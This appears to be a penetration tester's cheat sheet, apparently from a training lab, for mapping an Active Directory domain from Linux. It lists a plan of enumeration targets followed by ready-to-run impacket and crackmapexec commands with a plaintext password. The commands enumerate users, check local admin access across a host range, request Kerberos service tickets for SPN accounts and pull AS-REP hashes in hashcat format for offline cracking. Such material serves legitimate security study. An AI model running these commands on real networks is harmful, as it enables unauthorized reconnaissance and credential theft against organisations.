# Creating a map of an Active Directory domain from Linux:
#
# Users
# Groups
# Domain Information
# Domain joined computers
# Domain joined operating systems
# machines you can access as Local Administrator
# Current logon sessions on the domain (enumerate this for every user, not just the current one)
# SPNs (services integrated with AD)
# Enumerate for GenericAll ActiveDirectoryRights permissions 
# Enumerate domain shares

impacket-GetADUsers corp.com/pete:"Nexus123\!" -all -dc-ip 192.168.180.70				# enumerate users


crackmapexec smb 192.168.180.70-75 -u pete -p "Nexus123\!" -d corp.com --continue-on-success		# enumerate local access (be wary of lockout policy; password should be correct when using this command)

impacket-GetUserSPNs corp.com/pete:"Nexus123\!" -request -dc-ip 192.168.180.70				# enumerate the domain for SPNs running under user accounts

impacket-GetNPUsers corp.com/ -dc-ip 192.168.180.70 -format hashcat -usersfile users.txt		# enumerate for users with kerberos pre-authentication disabled


